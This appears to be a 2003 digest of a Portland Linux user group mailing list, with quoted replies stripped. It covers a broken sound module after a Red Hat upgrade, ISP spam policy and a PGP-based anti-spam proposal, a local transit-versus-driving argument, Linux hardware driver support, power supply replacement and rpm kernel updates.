/etc/isapnp.conf.  But I don't have any of those files on my system. 
Does anyone know what I can do?

I work for a local franchise of a larger ISP.  The Corporate office blocks
port 25 (ie. you have to use their SMTP server) and we have a local mail
server for the local users accounts plus domains hosted locally.  When
someone travels and uses a non-local dialup point they have to have two
mail accounts.  One on the local system and one on the corporate system
for outbound mail.  (They can use the corporate account only but we put 
the local in because we can respond and fix problems quicker.) 

   Locally we don't block any traffic.  You want a mail server on you DSL
(or dialup line) go for it.  Problem is if your machine is used for
SPAM'in by you or because it is an open relay - it costs.  $100 per
incident and if you don't fix the open relay or are doing the SPAM'in on
purpose $100 per message.  Once they (the customers) hear this they are
very willing to fix it and keep it fixed.

   Of course monitoring bandwidth usage and the type of traffic makes us 
much faster to respond.  We have taken a couple of DSL lines down when we 
couldn't get someone in charge or knowledgable to respond to our calls.  
That cost them $50.00 to reactivate the DSL line.

Not quite as draconian as port blocking but effective so far.

Post your modules.conf, or, at least, the sound section. And the model
of
your sound card. The isapnp stuff is only relevant if you have an old
ISA
sound card. For most modern sound cards, PCI or built-in, you run
sndconfig.

  You may or may not want XON/XOFF.  The man page is pretty good.

stty -a -F /dev/ttyS0, will show you how COM1 is currently configured.

Message-ID: <3FD88C54.40100@pobox.com>

I upgraded from RH7.3 to RH9 and it zapped my sound.  When I shutdown 
the system now, I get a message that says it could not find modules 
sound-slot-0 and sound-service-0.0.  I also get a message after logging 
in that says it could not find /dev/dsp.  I tried to find packages named 
sound-slot and sound-service but I don't think they exist.  I read the 
sound HOWTO and it is telling me to run pnpdump and isapnp and look in 
/etc/isapnp.conf.  But I don't have any of those files on my system. 
 Does anyone know what I can do?

  Just as a data point, be advised that not all USB serial dongels support
RTS/CTS.  Most of the cheap ones don't.  Ya'gotta read the specs and get the

Okay, I didn't know to look in modules.conf.  Fortunately, I made a 
backup of my system before I did the upgrade, so I compared my new 
modules.conf to my old one.  The 3 lines that set up my sound system 
modules had been removed for some reason, but everything else was 
exactly the same.  So I copied in the old modules.conf and it works fine 
now.

Yeah, I think the installer wants you to rerun sndconfig instead of just
migrating the old module lines (module names change, new drivers get
added,
this sort of stuff). Usually sndconfig gets run at some point during the
upgrade, but may be it decided to skip it for some reason, or you hit
cancel
in the wrong place.

I see.  Or they could just generate a new one in those cases.  Savvy
users will notice the discrepancy, of course, but then, most people who
reply to spam are not savvy.  In any case, it would be easy to obscure
an incriminating set of keys, should the trail need to be covered.

Aye, first give me the chicken, then I'll produce the egg!  Anyway, this
is getting a tad complex, so let me try to get it strait.  Email servers
(SMTP?) would require a razor-PGP-like filter, and unsigned emails would
be filtered categorically.  Those signed with a key that is known to the
razor service/network and in good standing, would be forwarded without
delay.  Emails signed with an unknown key would be held in queue for a
period of time, a sort of probation.  If during that time the key were
not reported as abusive--to the specific service/network being applied
(or would that be universal?)--then the mail would be shuttled along to
the recipient, and otherwise it would be filtered.  At some point, after
some number of successful deliveries, a key would achieve a "known"
status.

The following problems seem to remain:

If all the mail servers are stalling emails for our hypothetical two
hours, who in that time will read and report them as spam?  It would
have to be a large subset of users, for every spam is not sent to
everyone.  I suppose it would be voluntary, and if enough people get
tired of doing it and revert to waiting themselves, the plan will fail.

If the two-hour wait period is effective after all, spammers will resort
to signing each email with a new key, rendering the probationary period
moot.  (Or they will send only a small number of emails per key, which
would be about as effective.)  You say the process of generating keys
will slow them down appreciably.  I doubt it.  Spammers are
sophisticated assholes.  And all of this will encourage them to hijack
other people's machines to do their work.

Another possibility is that spammers will generate a key, send a few
legitimate, hi-how-ya-doin' type emails to his friends (if he has any)
in order to make the key "known", then use it to send five million
penis-pill ads, many of which will reach their destinations before
razor-pgp knows what hit it.


I'd like to know if there is any feasibility to the idea of a universal
web of trust, where users worldwide would have to join, or their emails
would be filtered by default.  Thus unknown keys would never be
delivered at all.

The trick is that this can be done at the email servers *and* the
client.  Currently some spam filters operate on the server before relay,
before delivery and at the client end.

If we allow for all those cases then power users and business users, who
want fast email, would likely turn off the delay, but still report.

In actuality if you check upon "attempt to pull mail" (either from the
client or the server), the the two delay is likely to be there for
non-power user and non-business users.

Also the razor-pgp would be a blacklist.  White Lists are local.

As I mentioned above, I did not intend to quarantine the mail, but that
is not a bad idea.  Something like this may work
  If spamscore > 6 and key == unknown then hold

This could just work like bulk/spam filters work now, they put the
likely spam in a mailbox for you to decide.

By linking the spam score with the key, you will catch even more.

spam is pretty non-discriminatory.  Scams used to be, but now are not.

If they had to wait yes.

Yes which make them work harder, but not you and I.  You still have the
forced then to work, and sign.

This is a good thought (or evil thought).

Even if they hijack, it makes their job more difficult, and *clearly*
illegal.  No free speech arguments now.

Just because it forces spammers to hijack other servers does not make it
bad.  I think it is good.  It makes then state their position, risk far
more personal issues, and work harder. 

To some extent it is like saying jewel thieves now have to break into
stores because the mean owners put locks up.

No this will not work.  The razor-pgp is a blacklist.  Whitelists are
local.  So his friends will be the only ones to get his spam.

I think universal webs of trust do not work.  Small webs of trust do,
and large webs of distrust work.

The trick is getting people to use a verifiable delivery systems (pgp
keys) in the first place.  Then webs of [dis]trust start to work.

This is how it works in the real world.  You know Bob, so if Bob say the
show is good you trust him.  If an unknown John say its good, you
hesitate.  If you meet John socially and get to know him, then you trust
him.

I know you're kidding and it WAS very funny, but I thought I'd just
reiterate my stance on hypocrisy.

I think it's impossible, given the current state of affairs, to be a good
person all the time and participate in open society.  Doing the right
thing would mean totally withdrawing from the exploitative economic
system, let alone the mess that transportation has become.

I also think you'll see that my rants against the automobile have almost
always narrowed the argument to their use within city limits.  There just
isn't a current workable system between cities.  It's impractically
difficult most of the time to get out of town without a private
automobile.

No one ever accused me of being perfect.

Pluggin is becoming enough of a bother to motivate me to venture into
the update waters(I used to use RH update, but I got tired of answering
their surveys).

A lesser soul would just beg for _detailed_ instructions on what to do,
you know like what rpms to obtain where, or if there is some new fangled
program like apt-get, how to obtain, install, and use it.  Not I.  I
propose a discussion of the various options:
1.  Update to Fedora and, shudder, read 40 or 50 on line manuals plus
assorted man pages written in modern geek.
2.  Install whatever passes for update, not using RH, and maybe not have
to read anything.
3.  Install XP
4.  Buy a Mac

I updated from RH9 to Fedora Core 1 last month.  Took about 1.5 hours
and I've been fully up and running since.  Then I installed apt-get
from Fedora along with synaptic.  It's incredible.  Way better than
up2date, and it worked right out of the box, which I could never get
up2date to do.

And I didn't have to read any manuals, just get the ISOs and
install/update away.

> 4.  Buy a Mac

Not a bad option at all if you have the cash.  But don't you have to
pay Uncle Steve for all operating system upgrades $$?

5. Install apt (comes with Fedora, should be downloaded from freshrpms
for RH8), add this line to sources.list:
rpm http://sluglug.ucsc.edu/macromedia/apt redhat/8.0 macromedia
run apt-get update && apt-get dist-upgrade && apt-get clean
and never bother with up2date again.

Good news:  Amtrak serves the I-5 corridor with local service to towns

$40/round trip is cheaper than driving?  You must not be factoring in

You failed social studies in high school, or just forget why Metro
exists?

Actually, that's exactly the kinds of populations cities are designed
to absorb.  Suburbs where originally where the population not
fortunate enough to be able to centrally locate themselves live.  And
for good reason: No lawn to mow, and you're walking distance to almost
everything instead of walking distance to a transit stop.  Smaller
cities also net you more open space to put towards agricultural and
recreational uses, less traffic, and faster, more effective transit.
LA and Seattle are classic examples of an almost uniquely American
mistake: The concept that the suburb is the city.

Actually, mass transit fares usually pay between 40 and 60% of
TriMet's income depending on what all is going on.  The motorist
equivalent, being gas tax, vehicle registration, parking meters, and
the occasional toll road don't quite cover 10% of the ODOT budget.  So
really, everybody is stuck subsidizing motorist's free use of vehicle
storage space outside of downtown areas, free access to non-toll
roads, noise, air and water pollution.  Who's screwing whom here?

Three or four times?  My old Buick never got great gas mileage and
didn't have a big gas tank, but I could still make it from Forest
Grove to Boring and back on a tank.

Because motorists have a revokable privilege to the street.  Thinking
you're better and have more right to something just because you have
more weight behind you in a vehicle is bully behavior on a criminally
stupid level.

Actually, it does have something to do with public safety, and you
named it.  A license plate's entire purpose is to identify a vehicle
that is stolen or operating outside the law.  Where did you get the
idea that it was for anything else?

I'm not sure on this one, but it seems to me Tri-Met uses buses a lot. 
I think those buses drive on the same roads I drive on.

I think most parking outside of downtown areas is in parking lots.  Or
garages.  Or driveways.  Or all three.  Maybe in Portland most folks
park their cars on the streets outside their homes?  They don't in the
areas I have lived, that's why we have garages and driveways.

I have a solution, though... I was just thinking about it earlier
today... we give the 'Portland Metro Area' to Washington.

What if you don't like living in a city?  I find being surrounded on all
sides by houses crammed into a small space just plain sucks.  I like
having a lawn to mow.  I like having woods to hike through.  I like
having a place I can use for target practice, for free.  These things
just don't exist in cities as much as in the country.

Mass transit is much slower than driving, as well.  I hear people speak
of using mass transit to save time... but that certainly hasn't been my
experience to date.

I get the same reactions on the train reading Linux Journal to and
from work.  I'll occasionally look up and someone's staring at me with
a look that just screams, "Hmm, wait, the rent-a-cop runs Linux?  It
can't be *that* hard..."

I recall Linus Torvalds opinion is that it's "LEE-nooks" but then when
he started travelling stateside people were correcting *his*
pronunciation and he just went with it.  If you look at the history of
Linux, Linus's actions say he doesn't care that it even has a name,
much less how you say it.  Linus didn't even bother naming it, the FTP
site he used originally did because the ftpmaster felt it needed a
name.

Right.  But you live in a city so there's country to go to within
reasonable distance.

Borrowing somebody else's country isn't the same as having your own bit
of country... most folks I know don't particularly appreciate strangers
running amok through their land.

It would be considerably more expensive to own both your own bit of
country and your own bit of city (be it renting or owning, I should
say)...

It is if I take TriMet.... a 35-minute commute turns in to an hour and a
half long ordeal.

Yes.  But consider gas consumption per person.  TriMet's fleet of
diesel-hydraulic busses get between 3 and 6 MPG and average hundreds
of riders a day each, with busier routes getting into the thousands of
passengers, whereas your car likely gets somewhere between 13-33 MPG
and you can count the number of passengers a day on one hand in most
cases.

But there still is free parking on the right-of-way unless there's a

Reduced tax revenue, you bet... but we wouldn't need nearly as much,
either.  The entire political climate would change.  The vast majority
of individuals using the welfare system would be in Washington.

The rest of the state doesn't *need* nearly the tax revenue Portland
does....

A curiously happy side-effect.  Not a very strong argument, but a good

More like having to steal jewels from people's houses instead.

I understand that, but weren't we talking about "known" and "unknown"

Just to clarify, "universal" implies singularity.  When you use "webs"
in the plural, you may mean something else.

As with webs of trust (as they exist), the more fragmented and numerous
they are, the more secure, and the less useful.  Maybe webs could join
in trust, as you describe with people, but then you'd have something
universal.  (There's a political metaphor here.)

Dunno, I really doubt you'll get more than 10% of email users signing
their emails, no matter how easy it is, unless you can convince them
there is a feasible solution to their personal spam problem.

Last I checked, that bridge that lost a patch into the river wasn't in
Portland.  You'd have a hell of a time fixing the highway
infrastructure without the revenue muscle of Portland.

If I can save up the cash I hope to get a Mac.  To be honest, I'm tired of 
sysadmin'ing, it would be nice to have something that just works out of 
the box.  Want to burn a DVD?  Fine just put it in the drive.  Want to 
hook up a digital camera - no problem just plug it into the USB. ... etc. 
Now you can do these things with Linux, but it tends to be a major 
project to get these sorts of things to work.

And those G5's are a work of art inside & out.

Anyone else wishing they could move to OSX?  (this is the Portland Linux 
Unix Group, right?  And OSX is Unix under the hood.)

I like the new OS X Macs, they are pretty darn cool. But it's hard to 
like Apple any better than Microsoft. The only difference is they're 
less successful in their evil. 

From a technical and usability standpoint, I like an open hardware 
platform, as well as open software. Several of my Linux customers have 
hired programmers, from time to time, to tweak applications, and a 
couple of times to audit the source code. Not to mention being able to 
compile for different platforms, or compiling in different options. So 
having the sources does matter to non-programmers. 

It does present some difficulties, because Linux is much closer to being 
a "Hole Hawg Drill" than the computer on the Enterprise, which is more 
like a magic genie. So I have to work harder to set things up for 
users, and they need more coaching. 

And don't forget the reason for poor hardware support in Linux is retard 
hardware manufacturers, who I suspect are so deeply in Microsoft's 
pocket they dare not support Linux. Otherwise how can anyone possibly 
explain their continued refusal to make use of the huge free Linux 
talent pool, which toils to write drivers even in the face of 
opposition? They don't even have to write their own, it's already being 
done. But too many of them won't even supply specs, or product for 
testing. 

My first job is to meet my user's needs, so that often means they use 
winduhs or Apple. But I get Linux in there whenever possible, because I 
do not care to be held hostage by such as microsoft or apple. They have 
proven again and again they cannot be trusted.

PSU has some obligatory iMacs scattered about, and I strongly prefer
them to the XP boxen.  If Linux weren't as great and fun as it is, I'd
get a Mac.  But it is, and I'm a po' student, so I don't.

Maybe I'm just that type'a guy.  I also prefer riding a motorcycle to
driving.  Even in the winter.

But my g'friend really *really* wants to get a PowerBook, 'cos she's
tired of OS9.  Any gal who wants to upgrade to *nix is a keeper.

Anyone considered giving an AT on getting started with *BSD?

It is always tempting to give up your freedom in exchange for safety or
comfort. I will not be giving up  linux for a proprietary software system.
No thank you.

I just did, for my laptop at least (12" powerbook G4).  Aside from
being fed up with lugging a 10lb. dell on my back all day for a
whopping 1:45 on the battery, I wanted a system that "just works".  I
love debian, and use it (almost) everywhere, but I've not been
thrilled with the entire Linux on a laptop adventure--The hardware
support is sufficient, but the installation/configuration is a bitch
when compared to MacOS.

So far I've been thrilled with the OS and the hardware.  With normal
use (programing, running time tests, configuring the environment--but
not playing mp3's) I get about 5 hours on the battery.
Powermanagement works excelently as well, not to mention stability.

The uptime clock apparently counts the time it's asleep as being
online, which is weird, but oh well.

Basically, it's been able to provide a stable low-hassle OS with apt,
bsd ports, and all the applications I use on a normal Debian system.
It also weights half what my "old" (6 month) Dell did.

The only difficulties I've had is with getting XDarwin to start up
with a Dvorak key layout, and setting the caps lock key to work as
control (it's "sticky", but I think that's a function of the hack I
used to remap it).

Three major reasons:
1. IP entanglement.  Most devices are made with chips from a few
different sources, and info about how they work is tied up in NDAs and
other contractural agreements.  It takes money, time (money), lawyers
(money) and internal politicking (money) to untangle things enough to
allow for open-source drivers and/or open specs.
 
2. Communication issues.  Oftentimes, components or even whole devices
are bought via a middleman or from a manufacturer who may feel that they
put their money into supplying a set of generic drivers and manual just
so they wouldn't have to deal with OEMs bugging their engineers.  The
engineers may be perfectly willing to supply the info to someone who's
capable of doing the drivers, but technical companies are organized to
keep the pesky customers from bugging the engineers.

3. Marketing issues.  Many important decisions end up being made in
Marketing, including things like platform support and target market.  
It may seem weird, but I hear that in some companies, when Marketing
says "XP and Win2K only", they mean it, and don't like folks messing
with their decisions.

So, yeah, stupid.

Oh, and don't forget the whole issue of hacking.  I'm sure manufacturers
worry that badly-written drivers could break hardware and cause warranty
claims, and I hear Intel doesn't like the fact that open-source drivers
for their Centrino WiFi chipset could allow for illegal transmit power
levels.

It's changing, though.  And I think that as long as it's easy to supply
specs or GPL code to someone who'll get it into the kernel, and really
heard to ship a binary driver for Linux, it'll continue to change.

Still, I wish there were a li'l library of reverse-engineering tools
(various sorts of bus scanners, etc.) to help with driver development.
Heck, maybe some well-funded Linux-booster organization could fund a
couple driver hackers and give 'em workbenches...

Well, Russy... whatever you're trying to say there has been hit by my
web filter as something I don't want to see, and I don't want to go
around it today.

I can only imagine what it must be based on your off-list emails to my
address in the last few days.

So, color me offended.

I think you have the wrong Russell as I didn't contact you off list I'm
also not really trying to offend, I'm trying to make you think about

My apologies... I tend to associate too much by first name, leading to
confusion... I was thinking of Russell Senior who has emailed me off
list a few times in the last week or so.

Since you aren't *that* Russell, I went ahead and downloaded the chicken
clucking wav file.  Ummm... ok.

Again, I am sorry for the identity confusion.

Why don't you turn on logging and see what's getting dropped?

And don't forget the reason for poor hardware support in Linux is
retard
hardware manufacturers, who I suspect are so deeply in Microsoft's
pocket they dare not support Linux. Otherwise how can anyone possibly
explain their continued refusal to make use of the huge free Linux
talent pool, which toils to write drivers even in the face of
opposition? They don't even have to write their own, it's already
being
done. But too many of them won't even supply specs, or product for
testing.
--

Carla, half of the hardware makers can't make a driver that works
worth a damn for windows, let alone write one for apple or some other
o/s / platform. It's not that they won't, but the fact that the
company is such a clusterfsck that they are physically unable to.

I don't think it is being bought by MS, but the sheer incompetence and
utter lack of communication between the departments of the majority of
the hardware vendors. And since the situation is probably "well, we
bought the print engine for this printer from Canon, but put out label
on it and Bob from Canon wrote this driver thingy before they laid him
off. . . "
Besides, given the "quality" software and documentation (that's a
whole 'nother issue that has me coughing up blood from newly formed
ulcers) that comes out of these places, do you really think they would
be much help even if they tried?

This may not be so theoretical. Hard drives making growling sounds
doesn't mean they're hungry, right?  This is usually a bad thing, right.

Bigfoot drives growl naturally, but Barracudas put the bite on you
silently. The Barracuda drive liked to eat Caviar, but they couldn't
stay on-line during the 4GB era. The DeskStar needs a while to get
charged up, is a silent killer, but is vulnerable through the vent. The
Fireball also attacks silently. Quantum has problems dealing with small
bits, but handles very large issues well.

Please send me more fun model names (off-list) and I'll post them on a
web page. (without the humor)

IMO (In My Observation) "growling" usually comes from a dying fan, while
"whining" comes from a failing hard drive. I've heard SCSI drives that
whine quite loudly for over a year before dying. 

I'd check the fans before diving checking the drive. I just jam
something into standard PS and case fans to stop them. I LOVE it when
customers tell me that their growling noise just stopped after a while.
Most assume that it fixed its self. I REALLY would like responsible PC
builders to quit using sleeve bearing fans in all PCs.

And the grand prize goes to Mike for his prescient diagnosis of my
problem. In mid browse we went to black.  I mean no witty error message
or warning just machine down.  It is running right now but the power fan
is _not_ turning.

I guess the solution is a new case, right?

I thought we weren't supposed to take power supplies apart!  Isn't the
fan an integral part of the power supply.  A case is a lot cheaper than
a house fire (:-).  How safe is this process of replacing a power supply
fan?

The system just went down?  Since you say it is running right now, I'm
going to assume it came back on.  It powering down like that is not a
good thing... it tends to imply hardware failure somewhere along the
line, unless you have ACPI running.

If the powersupply fan isn't turning, you just need to replace that. 
You aren't 'supposed' to open a PSU and replace the fan, though... it's
supposed to be dangerous, what with all the capacitors in there.  If a
PSU fan goes out, I usually replace the whole thing - they aren't too
terribly expensive and help get me ready for my next upgrade.

You don't need to replace the whole case.  The powersupply is likely
attached to the case only by the wires plugging in to devices inside the
case and four screws on the face of the thing, on the back of your
case.  Remove all those, slide the old powersupply out, and slide a new
one in.

Have fun.

Rob

In other words, they're more retarded that I thought, because:

1. their products need software drivers to work at all
2. good drivers and docs = less cranky customers pestering tech support, 
and maybe even increased sales
3. one nice *nix tarball feeds every single Linux, BSD, and Unix. Nice 
package maintainers roll them into handy binary packages for those who 
prefer such
4. But each winduhs - 9x, NT, ME, 2000, and XP- needs its own binary 
driver. Which often must be modified because the latest Service Pack 
hoses it. Plus we all know how upgrading to the next winduhs means 
either waving bye to many of your peripherals, or spending wads of 
money on new hardware. But that's OK, somehow
5. Linux developers are valiantly reverse-engineering and writing 
drivers anyway. But supporting this free labor pool with specs and 
product is, somehow, Wrong.

A little hobby of mine is every so often I make the rounds of various 
hardware companies, and ask them about Linux support. Why don't they 
have any. Do they have any future plans to offer it. The 
Linux-unfriendly companies, without exception, respond in one of two 
ways: they ignore me totally, or they claim "when customers ask for it, 
we'll look at it." Which everyone here knows is complete bunk. 

So, according to the responses in this thread so far, the main reasons 
for the lack of Linux hardware support are incompetence and confusion. 
This is what we trust our computing infrastructure to? People who can't 
say duh without stuttering? People who can't tie their own shoelaces? 
Or have an independent thought, or make an independent decision?

I'll stick with my collusion-with-m$ theory. I'm not discounting 
incompetence and confusion, but it's hard to believe that's the primary 
reason. Why would any businessperson in their right mind purposely 
ignore significant new markets? It makes no sense.

I would say if you have to ask-- don't.  There are capacitors inside that
can give you a nasty jolt even with the cord unplugged.  Shorting them
will arc and can cause burns, blindness, and unnecessary pants-wetting.
;-)

For $30-50 you can purchase a new power supply for your existing case,
which is generally a fairly easy thing to replace.  Alternatively, as you
already mentioned, you could get a new case, but moving all the computer
guts to a new case is pretty time-consuming.

This sounds like an excellent time to get a low-noise power supply. 
Simply Google for "silent pc" to get started.  I built my current system
from a used case, a good quality power supply with
temperature-controlled fan, mobo, cpu, and near-silent cpu fan.  I have
been pleased to be unoffended by the noise of the thing ever since.
The power supply I chose was a Seasonic SS-300FS.  It costs a little
more than the cheapest case, but to me the near-silence is worth it.

Message-ID: <000001c3c0d2$b56005a0$6bf49d0a@CACheSoftware.com>

My question is very basic.  I have a RedHat 6.2 system.  I would like to
update the kernel, but a long time ago the automatic up2date feature stopped
working.  I'm not sure why.  Therefore, I would like to update the kernel
the old-fashioned way: retrieving a kernel via ftp and running an rpm
command.  I did some searching on my own, but I'm not certain what the
canonical site would be to obtain the kernel, or what the appropriate
options to the rpm command should be.  Can someone please provide me with
these details, and any other steps that may be necessary to carry out this
update?

I know that I could just buy an new operating system, but this machine has a
good deal of software on it that probably would not be compatible with a
newer OS, and I've done extensive configuring of various services that I am
reluctant to redo.  Thanks in advance for any assistance, James

IME, hardware makers, if they provide any technical support at all, make
it very difficult to locate and make it cost money in terms of long
distance phone calls...

I'm not too up on cross-platform driver development, but I really don't
think you can write one nice little driver and expect it to compile
under Linux, FreeBSD, and Slowaurus.  If that were the case, FreeBSD
would have the same driver support Linux has, or very close to it... and
from what I understand, that just isn't the case.

Just playing devil's advocate...

A few things... 9x and Me can share binary drivers.  2K and XP can share
binary drivers.  NT and 2K can share some binary drivers.

There are, I believe, more folks buying new hardware devices to run them
on Windows 98 than there are buying new hardware devices to run them
with any Unix workalike.  On a cost/benefit analysis, if you have
limited driver writing resources, it seems to make sense to me to build
one driver for 9x and one for XP (which will probably work with 2K). 
Right there you've covered what... 95% of the market?

That said, if they would just release a little bit more information
about their hardware products, there are a multitude of volunteers out
there who will take that and turn it into a real driver for Linux.

One interesting perspective on drivers I read a little while ago had to
do with Patents.  It may have been here, so this may all be a rerun. 
Patents are so crazy these days, everything is patented.  You cannot
design a piece of hardware today without inadvertently stepping on a
half dozen patents.  If they released the specs of the hardware so OSS
writers could design drivers for it, you would also be opening up enough
of the hardware to the public so your competitors could see where you
accidentally stepped on their patent and then... you get sued.

They don't see Linux *as* a significant new market.  Not only is it
still not very popular (a few years ago weren't we all saying it was
going to be *way* more popular than it is today, today?)... I think
Linux users tend to be cheaper when buying hardware than M$ users.

Well, if you're going to spend $50, you might as well get a nicer case
than what you already have.  I just bought a MicroATX case at Newegg for
$26, including a 350 watt powersupply.

You should be able to find a new powersupply for under $30 if you really
shop around... check local small-time shops if you have any, they tend
to have good deals on these kinds of things, for whatever reason.  I
definitely wouldn't spend $50 for a new powersupply unless it's the
cream-of-the-crop and exactly what you've always been waiting for....

And I agree, moving to a new case is *way* more of an ordeal than
replacing the powersupply.  We're talking an hour vs a few minutes.

Where do you get this figure?

>From the 2002 fiscal year report
(http://www.odot.state.or.us/fsbpublic/FinRept2002.pdf) page 6, "As the
chart indicates, 62% of the Department's total revenues are derived from
taxes and State General Fund appropriations, while 24% comes from both
capital and operating grants that are predominantly federal in nature."

When examining the chart, I see Motor fuel taxes as contributing 33.9%,
weight mile tax 17.5% and Vehicle and other transportation taxes 9.8%.
Looks to me like drivers and owners are contributing at least 61.2%. 

Further examining the chart reveals that appropriations account for 0.9%
of the ODOT budget, and it's not clear that even this amount comes from
the State General fund.

I can count the number of miles driven daily in my personal vehicle on
one hand as well. At least, usually.

Another thing to think about. Buses don't pay gas tax. That bus tears up
the road a heck of a lot more than my car, and doesn't contribute one
penny to the road fund.

A parked car isn't damaging the road. 

Besides, where would your out of town relatives park? I'm assuming your
friends ride their bikes or the bus.

It would also shift most of the burden north. There are far fewer money
pits outside the metro area. But that's an entirely different scenario.

up2date probably stopped working because 6.2 updates were pulled from the 
servers.

I have these
kernel-2.2.19-6.2.7.i386.rpm
kernel-BOOT-2.2.19-6.2.7.i386.rpm
kernel-doc-2.2.19-6.2.7.i386.rpm
kernel-headers-2.2.19-6.2.7.i386.rpm
kernel-ibcs-2.2.19-6.2.7.i386.rpm
kernel-pcmcia-cs-2.2.19-6.2.7.i386.rpm
kernel-smp-2.2.19-6.2.7.i386.rpm
kernel-source-2.2.19-6.2.7.i386.rpm
kernel-utils-2.2.19-6.2.7.i386.rpm

Once you get your hands on the .rpms just do this as root,

# rpm -ivh kernel-2.2.19*

This will install the new kernel and associated flotsam along side your old 
one.  You now have two kernels to choose from at boot.

if you don't need any other of the packages, your done.  Can't remember if 
/etc/lilo.conf needs to be edited wiht RH 6.2 or not.  Take a look at it and 
  if necessary add a new stanza (duplicate the existing one and just change 
the kernel version.)  Run /sbin/lilo then reboot

Select your new kernel at the prompt and makes sure everything works as well 
as it did under the old kernel.  When you're happy with the new kernel, you 
can remove the old one

# rpm -q kernel

(you'll get a list of kernel packages installed)

# rpm -e kernel-2.the.old.one

You can find a 2.2.24 kernel for redhat 6.2 at rpmfind.net here
ftp://rpmfind.net/linux/redhat/updates/6.2/en/os/i386/kernel-2.2.24-6.2.3.i386.rpm

To install it, download it then use
rpm -hiv kernel-2.2.24-6.2.3.i386.rpm

It may complain that it depends on newer versions of other
packages which you will also have to download and install,
then go back and try installing the kernel again in
an iterative process until everythings sucessfully installs.

Thanks to all, especially those that refrained from the undeniably funny
idea of encouraging me to replace the fan and thereby electrocuting
myself. I replaced the power supply, $25 from Pacific Solutions, and
only had two screws left over (naturally they went under the front
cover, which I could only remove by loosening the CD ROM drive, sigh). 
God, these systems get dusty.  Everything appears to work.

I just fired up Mozilla to check... haven't used that baby in a *long*

It appears the lock file is put in ~/.mozilla/gobblygook/lock as a link
to 127.0.0.1:someport...

See if

$ rm ~/.mozilla/*/lock

..does the trick

In a message from Tim Roberts of XFree86 notoriety. Archived at:

-----8<-----------------------------------------------------------8<-----
Unfortunately, "interesting" and "meaningful" are NOT among the criteria used
by the US Patent and Trademark Office in awarding patents.  The fact is most
chip companies DO hold patents on some peculiar aspect of their chips, and
they have to pretend to protect them in order to maintain their usefulness.

Most people don't realize how much the patent business has turned from being
an invention protector into one big Pokemon game.  Company A decides to
attack Company B.  They lay down three of their patents in the Pokemon arena
and say, "AHA!, you violate these patents, please pay me a million a year or
I'll sue."

Company B goes back to their Pokedex, chooses three likely candidates from
THEIR patent portfolio, and responsd "AHA!, you are violating OUR patents!
Sign this cross-licensing agreement or my Charizard's flame thrower attack
will turn you to ashes."

The two companies sign the agreement in order to avoid the court system, put
their patents back into their Pokeballs, and life goes on.  They have to have
patents in order to make their Pokemon card deck strong enough to survive
battles like that.

Of course, this is all anathema to the open source and free software
movements.

This e-mail also demonstrates that my children have spent WAY too much time
with Pokemon.

Well, does the drive *feel* slow? :-)

Are there any strange messages in the log? The setup you described
doesn't sound terminated properly ... The 2940UW is an SE card and a
"U160-rated cable" is LVD. So the termination may be wrong. If you can
get the SCA adapter to terminate on SE, that may help.

SCA-2. SCA-1 is practically non-existent, and many of them were HVD
anyways.

There is a significant checklist for troubleshooting H323
connections. For Netmeeting, I think the best you can do by default
is get the one behind the Linux firewall to place a call, but not
receive unsolicited incoming calls ( And at that, AFAICR you have to
open a large range of ports, because they are negotiated by the H323
clients semi-randomly). To make it work otherwise, there are some
H323 proxy modules you can install that will make two way work with
one box inside the firewall. If you want more, you need to install a
video gatekeeper on the firewall, of which there are several free
ones available.

I think it is a tad more complicated than that.

A lot of hardware needs some sort of driver to work properly (things like hard 
disks etc. may not).  The time cost of the software is part of the time cost 
of bringing the product to market.  Having worked for a while in a company 
that had real hardware products, I know that the software often delayed 
things dangerously.  It's hard to write the drivers when you don't have 
working hardware.  But, once the hardware is working the pressure is on to 
ship so that your product it out there before everyone else's. 

If your product is best, but it is one month later than a competitor's 
product, you might as well start dumping the existing hardware on eBay.  
You'll never get the end shelves in the stores, the front pages of the adds 
etc.  You're too late.

This time pressure leads to people buying all kinds of Windows driver kits 
that "do all the work for you" (tm), copy-and-paste coding etc.  Everything 
bad that you can do with code is done and done frequently to chase the goal 
of time to market.  It is ugly.

As to point 5, that seems reasonable until you realize that most hardware is 
made up of the same chipsets and other components off the shelf.  Take Wlan 
cards.  There are only a half-dozen chipsets that are widely used.  There are 
only a half-dozen CardBus chipsets (maybe not even that many).  There are 
only a few radio chips.  So, you've really only got a few different cards, 
but all from different manufacturers etc.  They all think they are protecting 
something by frobbing bits and moving ports around.  To them, the _only_ 
thing that they see as "intellectual capital" is the collection of specs.  
Nearly everything else is off the shelf.

A huge amount of hardware is basically put together from a relatively small 
number of parts.  If you want to build a modem, there's only a few chipsets 
that are decent and cheap.  This means that the vast majority of cards and 
finished products out there are really very little different from each other.  
Skimping on paint, thinner boards, cheaper surface mount resistors etc. is 
how those companies make their margins.  Companies will do anything to remove 
just one component.  Who cares if you have to invert all the bits and feed 
everything backwards at 1/3 the bus speed?  This is why there are different 
drivers.

It's a weird world, but if you dig enough, some of it becomes comprehensible. 
Not that I agree with the way hardware companies think or behave, but it is 
more comprehensible.  You have to remember that the margins on most hardware 
is so rediculously small that it is amazing that they can make it at all.  
There is _very_ little money spent on actual research at most places.

It doesn't help the Linux world and will not until Linux represents a 
significant percentage of sales.  I think that a couple of premium brands 
would have realized that they could charge a significant price difference for 
"works with Linux" products, but they haven't clued in yet.

Time for my nap.

Best,
Kyle

If it's on an Ethernet port, then yes, it means bad cable. Signals are
getting interference and not presenting a good carrier signal to the
receiver.

Subject: [PLUG] Upgrading from Red Hat 7.3 to ...
Message-ID: <3FDAB650.4060607@adnap.no-ip.com>

Hello everyone.

I am currently running Red Hat Linux 7.3 on my server.  With the 
discontinuation of support from Red Hat, I have been looking at the 
alternatives.

I tried Gentoo, but my hardware (PII/233Mhz, 96MB RAM) is far too weak 
for all that compiling.  Debian looks promising and so does Fedora.  At 
this point, I am looking to the list for recommendations.

I am very interested in an upgrade path that will be the least 
troublesome and therefore produce the least downtime.  It would also be 
_very_ convenient to be able to keep my current config files.

These reasons point towards Fedora, but if Debian offers significant 
advantages, I might be convinced to switch.  In that case, what is the 
best way to go about it?

Thank you,
Evan

While it isn't RedHat, Fedora, or Debian... Slackware might be worth
considering, as well.

Slackware's philosophy is a bit different than that of RedHat/Fedora or
Debian.  It's a good rock solid distro, though.

If you check out the groups.google.com archive of
alt.os.linux.slackware, you'll see some stories folks have shared about
switching from RH to Slackware and the issues they've run in to, and how
they've solved them or decided Slackware wasn't for them.

If you want a bunch more info about it, I'd be happy to type some more..
